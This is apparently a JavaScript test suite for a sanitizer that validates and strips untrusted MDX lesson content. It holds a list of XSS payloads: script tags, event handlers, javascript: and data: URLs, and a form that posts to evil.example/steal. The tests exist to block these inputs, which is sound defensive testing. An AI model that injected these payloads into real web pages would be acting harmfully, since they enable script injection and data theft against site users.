import test from "node:test";
import assert from "node:assert";
import fs from "node:fs";
import path from "node:path";
import React from "react";
import * as runtime from "react/jsx-runtime";
import * as devRuntime from "react/jsx-dev-runtime";
import { renderToStaticMarkup } from "react-dom/server";
import { serialize } from "next-mdx-remote/serialize";
import remarkGfm from "remark-gfm";
import {
  remarkUntrustedMdx,
  validateUntrustedMdx,
  isSafeUntrustedUrl,
} from "../src/lib/mdx-untrusted.ts";

// Compiles with the SAME plugin chain <Mdx untrusted> uses, then renders to
// HTML so assertions are about what a browser would actually receive.
async function renderUntrusted(source) {
  // Third argument `true` = RSC mode, matching next-mdx-remote/rsc in Mdx.tsx.
  const { compiledSource } = await serialize(
    source,
    { mdxOptions: { remarkPlugins: [remarkGfm, remarkUntrustedMdx] } },
    true
  );
  const mod = new Function(compiledSource)({ ...runtime, ...devRuntime });
  const Playground = (props) =>
    React.createElement("pre", { "data-playground": JSON.stringify(props) });
  return renderToStaticMarkup(
    React.createElement(mod.default, { components: { Playground } })
  );
}

// Payloads from the Phase 0 audit plus common variants.
const MALICIOUS = [
  ['<script>fetch("/x")</script>', /<script/i],
  ['<iframe srcDoc="<script>parent.alert(1)</script>"></iframe>', /<iframe|srcdoc/i],
  ['<form action="https://evil.example/steal"><input name="p" /></form>', /<form|<input/i],
  ['<object data="https://evil.example/x.swf"></object>', /<object/i],
  ['<embed src="https://evil.example/x" />', /<embed/i],
  ['<meta httpEquiv="refresh" content="0;url=https://evil.example" />', /<meta/i],
  ['<base href="https://evil.example/" />', /<base/i],
  ['<style>{"body{display:none}"}</style>', /<style/i],
  ['<link rel="stylesheet" href="https://evil.example/x.css" />', /<link/i],
  ['<svg><script>alert(1)</script></svg>', /<svg|<script/i],
  ['<img src="x" onError="alert(1)" />', /onerror/i],
  ['<div onClick="alert(1)">x</div>', /onclick/i],
  ['<a href="javascript:alert(1)">x</a>', /javascript:/i],
  ['<a href="java\tscript:alert(1)">x</a>', /script:alert/i],
  ['<a href="//evil.example">x</a>', /evil\.example/i],
  ['<img src="data:image/svg+xml,<svg onload=alert(1)>" />', /data:/i],
  ["[x](javascript:alert(1))", /javascript:/i],
  ["![x](data:text/html,<script>alert(1)</script>)", /data:/i],
  ['<div style="position:fixed">x</div>', /style=/i],
  ['<div className="fixed inset-0">x</div>', /class=/i],
  ['<Unknown>x</Unknown>', /unknown/i],
];

for (const [payload, forbidden] of MALICIOUS) {
  test(`untrusted MDX: rejected at save time — ${payload.slice(0, 50)}`, async () => {
    const problems = await validateUntrustedMdx(`# t\n\n${payload}\n`);
    assert.ok(problems.length > 0, `validator accepted: ${payload}`);
  });

  test(`untrusted MDX: stripped at render time — ${payload.slice(0, 50)}`, async () => {
    const html = await renderUntrusted(`# t\n\n${payload}\n`);
    assert.doesNotMatch(html, forbidden, `rendered dangerous output: ${html}`);
  });
}

test("untrusted MDX: JS expressions and ESM are rejected and never emitted", async () => {
  for (const payload of ["{alert(1)}", "export const x = 1", 'import x from "y"']) {
    assert.ok((await validateUntrustedMdx(payload)).length > 0, payload);
  }
  const html = await renderUntrusted("a {alert(1)} b\n\nexport const x = 1\n");
  assert.doesNotMatch(html, /alert/);
});

test("untrusted MDX: disallowed element subtree is removed entirely", async () => {
  const html = await renderUntrusted('<form><a href="/ok">inner</a></form>\n\nafter');
  assert.doesNotMatch(html, /inner/);
  assert.match(html, /after/);
});

const LEGIT = `# عنوان الدرس

فقرة **عريضة** و\`code\` و[رابط داخلي](/learn/html/01-structure) و[خارجي](https://developer.mozilla.org).

\`\`\`html
<script>console.log("inside a code fence is just text")</script>
<form><input /></form>
\`\`\`

| العمود | القيمة |
| --- | --- |
| a | b |

<details>
  <summary>اضغط</summary>
  محتوى مخفي
</details>

<Playground initialCode="print('hi')" mode="python" height="320" />

![صورة](/logo.png)

- عنصر 1
- عنصر 2
`;

test("untrusted MDX: legitimate lesson content passes validation", async () => {
  assert.deepStrictEqual(await validateUntrustedMdx(LEGIT), []);
});

test("untrusted MDX: legitimate lesson content still renders", async () => {
  const html = await renderUntrusted(LEGIT);
  assert.match(html, /<h1>عنوان الدرس<\/h1>/);
  assert.match(html, /<strong>عريضة<\/strong>/);
  assert.match(html, /href="\/learn\/html\/01-structure"/);
  assert.match(html, /href="https:\/\/developer.mozilla.org"/);
  assert.match(html, /<table>/);
  assert.match(html, /<details>/);
  assert.match(html, /data-playground=/);
  assert.match(html, /initialCode/);
  assert.match(html, /<img src="\/logo.png"/);
  // Code fences are text, never elements.
  assert.match(html, /&lt;script&gt;/);
  assert.doesNotMatch(html, /<script/);
});

test("untrusted MDX: Playground mode is restricted to the known modes", async () => {
  assert.ok((await validateUntrustedMdx('<Playground mode="evil" />')).length > 0);
});

test("untrusted MDX: MDX syntax errors are reported instead of crashing the page", async () => {
  const problems = await validateUntrustedMdx("<div>\n\nunclosed");
  assert.ok(problems.length > 0);
});

test("isSafeUntrustedUrl allowlist", () => {
  for (const ok of ["https://a.com", "http://a.com/x", "/learn", "#h", "./a", "../b", "img.png"]) {
    assert.ok(isSafeUntrustedUrl(ok), ok);
  }
  assert.ok(isSafeUntrustedUrl("mailto:a@b.c", true));
  for (const bad of [
    "javascript:alert(1)",
    "JAVASCRIPT:alert(1)",
    " javascript:alert(1)",
    "java\nscript:alert(1)",
    "data:text/html,x",
    "vbscript:x",
    "//evil.com",
    "/\\evil.com",
    "mailto:a@b.c",
    "",
  ]) {
    assert.ok(!isSafeUntrustedUrl(bad), bad);
  }
});

test("wiring: DB lessons render untrusted, and the CMS actions validate before writing", () => {
  const page = fs.readFileSync(
    path.join(process.cwd(), "src/app/learn/[tech]/[lesson]/page.tsx"),
    "utf8"
  );
  assert.match(page, /<Mdx source=\{data\.content\} untrusted=\{data\.source === "db"\} \/>/);

  const actions = fs.readFileSync(
    path.join(process.cwd(), "src/app/admin/content/actions.ts"),
    "utf8"
  );
  const update = actions.slice(actions.indexOf("export async function updateDbLesson"));
  assert.ok(
    update.indexOf("validateUntrustedMdx(content)") < update.indexOf(".update(contentLessons)"),
    "updateDbLesson must validate before the UPDATE"
  );
});
